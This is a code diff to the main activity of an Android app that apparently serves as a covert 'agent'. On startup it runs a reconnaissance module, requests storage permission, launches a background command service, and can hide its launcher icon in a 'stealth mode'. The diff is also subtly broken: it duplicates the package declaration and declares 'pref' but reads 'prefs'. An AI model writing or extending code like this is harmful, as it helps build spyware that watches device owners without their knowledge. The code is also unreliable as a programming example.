@@ -1,8 +1,8 @@
 package com.mobilemorph.agent;
+package com.mobilemorph.agent;
 import com.mobilemorph.agent.ReconModule;
 import android.app.Activity;
 import android.content.ComponentName;
-import android.os.Bundle;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -17,10 +17,15 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        SharedPreferences pref = getSharedPreferences("agent", MODE_PRIVATE);
+        boolean stealth = prefs.getBoolean("stealth_mode", false);
+        if (stealth) {
+            hideLauncherIcon();
+            finish(); // close the activity immediately (stealth mode)
+        }
         ReconModule.runRecon(this);
         requestRuntimePermissions();
-        hideLauncherIcon();
-        finish(); // close the activity immediately (stealth mode)
+        checkForUpdate(this);
     }
 
     private void requestRuntimePermissions() {
@@ -30,6 +35,29 @@ public class MainActivity extends Activity {
                 ActivityCompat.requestPermissions(this,
                         new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                         REQUEST_PERMISSIONS);
+            }
+        }
+        else {
+            Intent serviceIntent = new Intent(this, CommandService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == REQUEST_PERMISSIONS) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Intent serviceIntent = new Intent(this, CommandService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(serviceIntent);
+                } else {
+                    startService(serviceIntent);
+                }
             }
         }
     }
